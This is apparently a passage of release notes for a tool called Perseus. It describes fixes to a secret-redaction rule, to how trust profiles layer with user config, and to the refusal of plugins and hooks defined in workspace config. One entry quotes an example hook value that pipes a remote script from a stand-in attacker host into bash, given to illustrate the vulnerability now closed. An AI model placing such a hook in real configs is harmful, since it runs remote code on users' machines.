21|### 🔒 Security
22|
23|- **#136** — `long_hex_secret` default redaction rule rewritten. The pre-1.0.6
24|  rule (`\b[a-fA-F0-9]{40,}\b`) silently destroyed git commit hashes (40 hex),
25|  SHA-256 checksums (64 hex), Docker digests, and Atlassian content hashes in
26|  `@query`, `@waypoint`, and `@perseus` output. The rule now requires an
27|  explicit credential anchor (`secret=`, `token:`, `api_key=`, `Authorization=`,
28|  etc.) before redacting hex strings. Real secrets in credential context are
29|  still caught; bare hashes survive verbatim. New regression tests in
30|  `tests/test_redaction.py`.
31|- Internal: redaction rules now support an optional `_anchor_group` field that
32|  identifies which capture group holds the secret payload (everything outside
33|  the group is preserved). Used by `long_hex_secret`; available for future
34|  context-aware rules.
35|
36|### 🔧 Configuration & Trust Profiles
37|
38|- **#129** — Trust profile layering made structural. Pre-1.0.6 a workspace
39|  config setting both `permissions.profile: balanced` and
40|  `render.allow_query_shell: true` silently rendered with shell execution
41|  disabled because the profile merge overwrote the user's explicit value.
42|  v1.0.6 uses `skip_keys` to guarantee that an explicit user value for any
43|  `render.*` boolean security gate always wins over the profile default,
44|  regardless of profile or direction. Also covers `allow_agent_shell`,
45|  `allow_services_command`, `allow_remote_services_health`, and
46|  `allow_outside_workspace`. Audit trail records layering decisions.
47|
48|### 📦 Migration Notes
49|- No config breaking changes.
50|- Explicit user values in `render.*` now structurally win over profile defaults.
51|- If you had relied on `long_hex_secret` redacting bare hex output, add an
52|  explicit user rule under `redaction.patterns`.

54|### 🔒 Security
55|
56|- **#169** — Workspace-sourced plugin configuration (`plugins.dir`) is
57|  now refused by default. Pre-1.0.6 a workspace `.perseus/config.yaml`
58|  setting `plugins.dir: /path/to/attacker/code` caused
59|  `_discover_plugins()` to `spec.loader.exec_module(mod)` on every
60|  `.py` file in that directory at startup — full Python execution
61|  before any directive trust gate, audit, or user prompt. Same attack
62|  vector as #168 but with no shell-quoting limits. Attack: git clone a
63|  malicious workspace, get pwned.
64|
65|  Fix: `_discover_plugins` consults
66|  `cfg["_provenance"]["plugins_workspace_sourced"]` set by
67|  `load_config`. Workspace-sourced plugin config is refused unless BOTH:
68|  1. Global `~/.perseus/config.yaml` sets `plugins.allow_workspace_sourced: true`
69|  2. Env var `PERSEUS_ALLOW_DANGEROUS=1`
70|
71|  Refusal emits a `plugins_workspace_refused` audit event with the
72|  refused directory path. Global-sourced plugin config is unaffected.
73|
74|  Regression suite (8 tests): workspace plugin dir refused by default,
75|  allowed with full opt-in, refused with only-global, refused with
76|  only-env, global plugins always load, audit trail, no false-positive
77|  refusal when no plugin config exists, allow-gate helper unit test.
78|
79|- **#168** — Workspace-sourced shell hooks and Python `hooks.dir` are
80|  now refused by default. Pre-1.0.6 a workspace `.perseus/config.yaml`
81|  could declare `hooks.on_render_start: ["curl evil.sh | bash"]` and
82|  the command would run on the next `perseus render` — no
83|  `allow_query_shell`, no `PERSEUS_ALLOW_DANGEROUS`, no audit. Same
84|  attack via `hooks.dir: /path/to/attacker/code` (Python top-level
85|  code runs at import time). Attack: git clone a malicious workspace,
86|  get pwned.
87|
88|  Fix: `load_config` annotates `cfg["_provenance"]` with which
89|  sections came from the workspace source. `hooks.py` refuses
90|  workspace-sourced shell hooks and `hooks.dir` Python hooks unless
91|  BOTH conditions are met:
92|  1. Global `~/.perseus/config.yaml` sets `hooks.allow_workspace_sourced: true`
93|  2. Env var `PERSEUS_ALLOW_DANGEROUS=1` is set
94|
95|  Refusal emits `hooks_workspace_refused` / `hooks_workspace_shell_refused`
96|  audit events plus a stderr warning. Global-sourced hooks are
97|  unaffected (the user owns global config; trust is implicit).
98|
99|  Regression suite (10 tests): workspace shell hook refused, allowed
100|  with full opt-in, refused with only-global opt-in, refused with
101|  only-env opt-in, global hooks always run, provenance tracking, audit
102|  trail, Python hooks.dir refused.

108|### 🔒 Security Hardening
109|
110|- **#129** — Trust profile / user config layering is now **structurally**
111|  guaranteed to honor explicit user overrides, regardless of the textual
112|  order in which `_apply_permission_profile` and the user-merge run.
113|
114|  **Problem (pre-v1.0.6):** the layering precedence rule "user config wins
115|  over profile defaults" was correct *as documented* (see `task-45 AC #3`)
116|  but depended entirely on `load_config` calling `_apply_permission_profile`
117|  BEFORE the user-merge step. Any future refactor that reordered these two
118|  calls — or a third caller that invoked the profile-apply directly without
119|  knowing the convention — would silently revert a user who set
120|  `permissions.profile: balanced` AND `render.allow_query_shell: true` to
121|  `allow_query_shell=false`. This is exactly the scenario filed in #129
122|  ("balanced profile silently disables `@query` despite explicit override").
123|
124|  **Fix:**
125|  1. `load_config` now pre-scans all sources to collect every
126|     `(section, key)` the user has explicitly set, then passes that set
127|     to `_apply_permission_profile(..., skip_keys=...)` as the new
128|     keyword arg.
129|  2. `_apply_permission_profile` skips any key in `skip_keys`,
130|     structurally guaranteeing that user values win. The legacy
131|     no-skip-keys signature is preserved for backward compatibility.
132|  3. `load_config` emits a `config_profile_overridden` audit event
133|     enumerating which user-set keys won out over the profile. This
134|     makes the layering decision observable and debuggable.
135|
136|  **Regression test matrix:** 30 parametrized tests covering all 3
137|  profiles × all 5 boolean security gates × both override directions,
138|  plus 6 explicit tests for direct unit behavior, workspace>global
139|  precedence, audit-event observability, and no-noise audit events
140|  when only non-profile-managed keys are set.
141|
142|  No config breaking changes. Behavior is strictly safer.

158|### 🐛 Bug Fixes
159|
160|- **#128** — Mnēmē narratives written under pre-1.0.3 (which used an MD5
161|  hash for the per-workspace narrative filename) are no longer silently
162|  orphaned on upgrade. v1.0.3+ uses SHA-256; previously, `_mneme_path()`
163|  unconditionally returned the SHA-256 path and the MD5 file sat untouched
164|  on disk while the user saw `> ⚠ No Mnēmē narrative found for this
165|  workspace.`.
166|  - `_mneme_path()` now performs a one-shot in-place rename: if the
167|    SHA-256 path doesn't exist but the legacy MD5 path does, `os.replace`
168|    is used to atomically move it. The narrative is preserved verbatim.
169|  - If both paths exist (concurrent write race, or operator-staged files),
170|    the current SHA-256 file wins and the legacy file is left untouched.
171|  - New CLI: **`perseus memory doctor`** — read-only scan of the memory
172|    store that classifies files as SHA-256, legacy MD5, orphan, or unknown.
173|    Add `--migrate` to rename all legacy files in one pass; add `--json`
174|    for machine-readable output. Idempotent.
175|  - New helpers: `_workspace_hash_legacy_md5()`, `_mneme_doctor_scan()`,
176|    `_mneme_doctor_migrate()` — all importable from `perseus.py` for
177|    operators who need to script around them.
